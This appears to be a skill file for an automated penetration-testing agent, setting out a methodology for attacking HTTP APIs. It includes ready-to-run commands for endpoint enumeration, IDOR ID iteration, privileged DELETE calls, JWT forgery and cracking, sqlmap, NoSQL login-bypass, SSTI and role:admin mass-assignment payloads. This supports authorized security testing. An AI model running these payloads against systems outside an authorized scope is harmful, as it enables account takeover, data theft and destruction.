---
name: api_security
description: Methodology for assessing HTTP APIs (REST/GraphQL/gRPC-web) — enumerate endpoints and auth, then validate authz, injection, and logic flaws.
---

# API Security

An API asset (kind: url) is a programmatic HTTP surface — REST, GraphQL, gRPC-web, SOAP, or JSON-RPC — that exposes business logic and data over predictable, often documented, endpoints. Unlike rendered web apps, APIs trust the caller far more: there is no DOM, no CSRF token UI flow, and frequently weak per-object and per-function authorization. The attacker's objective is to first map every endpoint, parameter, and authentication scheme, then escalate by abusing broken object-level authorization (BOLA/IDOR), broken function-level authorization (BFLA), injection, mass assignment, and business-logic gaps to read or mutate data belonging to other tenants or to act as a higher-privileged role.

## Attack Surface

- **Endpoints**: versioned paths (`/api/v1`, `/v2`, `/internal`), resource collections (`/users/{id}`), RPC actions (`/rpc`, `/graphql`), admin routes (`/admin`, `/actuator`, `/debug`).
- **Auth schemes**: Bearer/JWT, API keys (header/query), OAuth2 token endpoints, HMAC-signed requests, mTLS, session cookies, basic auth on internal endpoints.
- **Parameters**: path IDs, query filters, JSON/XML bodies, headers (`X-User-Id`, `X-Tenant`, `X-Forwarded-For`), multipart uploads, GraphQL variables.
- **Specs & discovery docs**: `openapi.json`, `swagger.json`, `/swagger-ui`, `/api-docs`, `/graphql` introspection, `.well-known/`, WSDL, `apple-app-site-association`, gRPC reflection.
- **Hidden methods/verbs**: endpoints that only accept `PUT`/`PATCH`/`DELETE`, `OPTIONS`-revealed verbs, HTTP method override headers (`X-HTTP-Method-Override`).
- **Indirect surface**: webhooks/callbacks, rate-limit and quota logic, pagination cursors, bulk/batch endpoints, file import/export jobs.

## Recon & Enumeration

```bash
# Resolve host + alive probing with tech/title/status/tls metadata
echo "api.target.tld" | httpx -json -td -title -sc -server -tls-probe -o httpx.jsonl
# Port + service map (catch non-443 API listeners, gRPC, admin ports)
naabu -host api.target.tld -top-ports 1000 -o naabu.txt
nmap -sV -sC -Pn -p- --min-rate 2000 api.target.tld -oA nmap_api

# Discover spec/docs files — these collapse recon time dramatically
ffuf -u https://api.target.tld/FUZZ -mc 200,401,403 \
  -w <(printf '%s\n' openapi.json swagger.json swagger/v1/swagger.json \
  api-docs v2/api-docs api-docs.json apidocs swagger-ui.html swagger-ui/ \
  graphql graphql/console graphiql playground .well-known/openapi)

# Crawl JS bundles for endpoints, keys, and route fragments
katana -u https://api.target.tld -jc -kf all -d 3 -o katana.txt
subfinder -d target.tld -all -silent | httpx -silent -o api_subs.txt

# Brute endpoints/params when no spec exists
ffuf -u https://api.target.tld/api/v1/FUZZ -w api-wordlist.txt -mc all -fc 404 -o ffuf_ep.json
ffuf -u 'https://api.target.tld/api/v1/users?FUZZ=1' -w params.txt -mc 200 -fs 0  # param mining

# WAF + automated checks
wafw00f https://api.target.tld
nuclei -u https://api.target.tld -tags exposure,misconfig,api,swagger,graphql \
  -s critical,high,medium -rl 40 -c 15 -timeout 10 -j -o nuclei_api.jsonl
# Feed an OpenAPI spec directly to nuclei for spec-driven coverage
nuclei -l openapi.json -im openapi -as -s critical,high -j -o nuclei_spec.jsonl

# Secret hunting in leaked specs, source, or mobile clients
trufflehog filesystem ./downloaded_specs --json > tru.json
gitleaks detect --source ./repo --report-path gitleaks.json
semgrep --config p/secrets --config p/owasp-top-ten ./repo
```

Asset-specific tooling to install when relevant:
- GraphQL: `pip install graphql-cog || go install github.com/dolevf/graphql-cop@latest`; `clairvoyance` for schema recovery against disabled introspection (`pip install clairvoyance`).
- gRPC-web/reflection: `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest`.
- JWT analysis: `jwt_tool` (already in sandbox) — `pip install jwt_tool` if absent.
- Spec replay/fuzz: `pip install schemathesis`; run `st run openapi.json --checks all`.
- Postman/Insomnia collection import for auth flows; `mitmproxy`/`Caido` for capture-replay.

## Methodology

1. **Inventory the API**. Pull every OpenAPI/Swagger/WSDL spec and GraphQL introspection. Where introspection is disabled, recover the schema with `clairvoyance`. Crawl JS with `katana` and grep for fetch/axios URLs and route tables.
2. **Map authentication**. Identify each scheme (JWT vs API key vs cookie vs HMAC). Capture a valid token. Decode JWTs (`jwt_tool <token>`), note `alg`, `kid`, claims (`role`, `tenant`, `sub`, `scope`), and expiry.
3. **Establish role/identity matrix**. Obtain at least two accounts (low-priv A, low-priv B) plus an unauthenticated baseline, ideally a high-priv account. This matrix is the foundation of every authz test.
4. **Test object-level authz (BOLA/IDOR)**. For every endpoint with an ID, replay account-A requests using account-B's token (and vice versa) and unauthenticated. Increment, decrement, swap UUIDs, and try predictable IDs.
5. **Test function-level authz (BFLA)**. Replay admin/privileged endpoints with low-priv tokens and no token. Swap HTTP verbs and method-override headers.
6. **Test injection**. SQL/NoSQL/command/SSTI/XXE/LDAP across JSON bodies, query params, and headers — APIs frequently skip the input validation that the UI enforced.
7. **Test mass assignment & input handling**. Add unexpected fields (`isAdmin`, `role`, `verified`, `balance`) to write requests; flip read-only fields.
8. **Test business logic & rate limits**. Race conditions on financial/quota endpoints, negative quantities, replayed idempotency keys, broken state machines.
9. **Validate, score, document**. Build a minimal reproducible PoC per finding (curl + exact tokens/IDs), confirm cross-account impact, and stop at minimal-impact proof.

## Key Weaknesses / Techniques

### BOLA / IDOR (object-level authz)
Most common and highest-impact API flaw. Replay another tenant's resource with your own credentials.
```bash
# Account B's token requesting Account A's order
curl -s https://api.target.tld/api/v1/orders/1042 -H "Authorization: Bearer $TOKEN_B"
# Iterate IDs to confirm horizontal access
for id in $(seq 1000 1100); do
  curl -s -o /dev/null -w "%{http_code} $id\n" \
    https://api.target.tld/api/v1/users/$id/profile -H "Authorization: Bearer $TOKEN_B"
done
```
Also test UUID swaps, nested IDs (`/accounts/A/cards/B`), and IDs hidden in JSON bodies, not just paths.

### BFLA (function-level authz)
Low-priv or anonymous calls to privileged actions.
```bash
# Low-priv token hitting an admin route
curl -s -X DELETE https://api.target.tld/api/v1/admin/users/5 -H "Authorization: Bearer $TOKEN_LOW"
# Verb tampering / method override when DELETE/PUT is blocked at the edge
curl -s -X POST https://api.target.tld/api/v1/admin/users/5 \
  -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN_LOW"
```

### Broken authentication / JWT abuse
```bash
jwt_tool "$JWT" -M at        # all attack modes / playbook
jwt_tool "$JWT" -X a         # alg:none (none/None/NONE) signature strip
jwt_tool "$JWT" -X k -pk key.pem    # confused-deputy RS256->HS256 with public key as HMAC secret
jwt_tool "$JWT" -C -d wordlist.txt  # crack weak HMAC secret
```
Also: expired-token acceptance, missing signature verification, `kid` SQLi/path traversal, JWKS spoofing, and accepting tokens from a sibling service/audience.

### Injection (validation gap vs UI)
```bash
sqlmap -u 'https://api.target.tld/api/v1/search?q=1' \
  --headers="Authorization: Bearer $TOKEN" --level 3 --risk 2 --batch
# NoSQL operator injection in JSON body
curl -s https://api.target.tld/api/v1/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":""}}'
# SSTI in fields rendered server-side (mailers, PDF, templates)
curl -s -X POST https://api.target.tld/api/v1/profile -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"${7*7}"}' ; # also try {{7*7}}, #{7*7}, <%= 7*7 %>
```
For XXE, send `Content-Type: application/xml` even to JSON endpoints — many parsers accept both.

### Mass assignment / excessive data exposure
```bash
# Inject privileged fields the UI never sends
curl -s -X PATCH https://api.target.tld/api/v1/users/me -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"email":"x@x.tld","role":"admin","emailVerified":true,"accountId":1}'
```
Excessive exposure: a GET that returns full objects (password hashes, internal flags, other users' PII) where the UI only renders a subset.

### GraphQL-specific
```bash
# Introspection dump
curl -s https://api.target.tld/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
graphql-cop -t https://api.target.tld/graphql   # batching/introspection/DoS checks
```
Test query batching to bypass rate limits and brute-force, alias-based amplification, deeply nested queries (DoS), and per-field authz gaps.

### Business logic & rate limits
- Race conditions on coupon/withdraw/transfer endpoints (`turbo intruder`/parallel curl) — see race_conditions skill.
- Negative or oversized quantities, currency/price tampering, replayed idempotency keys.
- Missing rate limits on OTP/login/reset → enumeration and brute force.

## Validation

1. **Reproduce deterministically**: a single curl with the exact token, method, headers, and body that triggers the issue, runnable twice with the same result.
2. **Prove cross-boundary access for authz bugs**: show account B reading/mutating account A's data, or a low-priv token performing an admin action — include both the unauthorized success and the expected `403` from a correctly scoped request.
3. **Prove injection with a controlled oracle**: boolean/time-based DB differential, or an OAST hit (`interactsh-client -v`, embed the `*.oast.fun` host) for blind SSRF/RCE/SSTI — confirm the callback source is the server, not your client.
4. **Minimal-impact PoC only**: read one benign record or echo a marker value; do not bulk-exfiltrate or mutate production data beyond proof.
5. **Capture evidence**: request/response pairs, token claims used, and the specific parameter under attacker control.

## False Positives

- A `200` from an IDOR attempt that returns the **caller's own** object (server ignored the path ID) — confirm the data actually belongs to the other tenant.
- `401/403` enforced at the edge/gateway but the documented endpoint is simply unauthenticated by design (public catalog, health, metrics).
- Reflected `${7*7}`/`{{7*7}}` echoed verbatim (no evaluation) — not SSTI unless it computes `49`.
- "Secrets" in specs/JS that are public client IDs, sandbox keys, or test fixtures — verify they authenticate against the live API.
- Verbose error messages on a non-production/staging host out of scope.
- nuclei swagger/exposure hits where the endpoint requires valid auth or returns a generic deny — confirm content, not just status.
- Rate-limit "bypass" caused by your own IP rotation while the real limit is per-account.

## Chaining & Impact

- **BOLA + excessive exposure** → bulk PII/data exfiltration across all tenants by iterating IDs.
- **Mass assignment (`role:admin`) → BFLA** → full account takeover and admin API control.
- **JWT alg confusion / weak secret** → forge arbitrary `sub`/`role` → impersonate any user, including admin.
- **SSRF via URL/webhook parameter → cloud metadata** → IAM credentials → control-plane access (see ssrf skill).
- **SQLi → DB read → password hashes / session tokens** → authenticated pivot to higher-priv functions.
- **GraphQL batching → auth brute force / rate-limit bypass** → credential stuffing at scale.
- **Leaked spec/key (trufflehog) → authenticated enumeration** → turns a black-box test into a privileged one.

## Pro Tips

1. Always test the unauthenticated baseline first — surprisingly many "internal" or admin endpoints answer with no token at all.
2. The OpenAPI/Swagger spec is ground truth: it lists every verb, required field, and enum the UI hides. Feed it to `nuclei -im openapi` and `schemathesis` for free coverage.
3. Keep a clean two-account replay harness; the fastest BOLA win is swapping `Authorization` headers across captured requests, not crafting new ones.
4. Diff responses, not just status codes — a `200` with a different `Content-Length`/body for another user's ID is the real signal.
5. Strip or rename the `Authorization` header rather than only deleting it; some gateways add a default service token when none is present.
6. Try alternate content types (`application/xml`, `application/x-www-form-urlencoded`, JSON arrays) — parsers and validators often diverge and reopen mass-assignment/XXE.
7. Older API versions (`/v1` when `/v2` is current) frequently lack the authz fixes of the latest — always enumerate every version.
8. For GraphQL with introspection disabled, `clairvoyance` reconstructs the schema from error suggestions; never assume a closed schema is closed.
9. Watch for `X-Forwarded-For`/`X-Original-URL`/`X-Real-IP` trust — header-based authz and IP allowlists are common and trivially spoofed.
10. Rate-limit your own tooling (`nuclei -rl`, bounded `ffuf -rate`) to stay within authorized scope and avoid tripping account lockouts that block further testing.
